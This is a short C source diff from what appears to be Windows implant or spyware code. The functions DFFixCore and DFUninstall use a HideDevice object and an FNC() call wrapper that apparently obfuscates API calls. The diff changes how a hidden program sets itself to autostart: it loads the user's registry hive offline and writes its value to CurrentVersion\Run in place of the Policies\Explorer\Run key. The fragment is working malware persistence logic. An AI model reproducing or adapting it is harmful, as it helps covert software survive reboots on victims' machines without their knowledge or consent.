@@ -207,8 +207,9 @@ BOOL DFFixCore(HideDevice *pdev_unhook, unsigned char *core_name, unsigned char 
 		FNC(RegCloseKey)(hOpen);
 	}
 
-	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) != ERROR_SUCCESS &&
-		FNC(RegCreateKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) != ERROR_SUCCESS) {
+	// XXX-NEWREG
+	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) != ERROR_SUCCESS &&
+		FNC(RegCreateKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) != ERROR_SUCCESS) {
 		FNC(RegUnLoadKeyW)(HKEY_LOCAL_MACHINE, L"CURRENT_NTUSER\\");
 		pdev_unhook->df_freeze();
 		return FALSE;
@@ -427,7 +428,8 @@ BOOL DFUninstall(HideDevice *pdev_unhook, unsigned char *core_path, unsigned cha
 		FNC(RegCloseKey)(hOpen);
 	}
 #else
-	if (FNC(RegOpenKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) == ERROR_SUCCESS) {
+	// XXX-NEWREG
+	if (FNC(RegOpenKeyW)(HKEY_USERS, L"CURRENT_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) {
 		FNC(RegDeleteValueA) (hOpen, (char *)reg_key_name);
 		FNC(RegCloseKey)(hOpen);
 	}
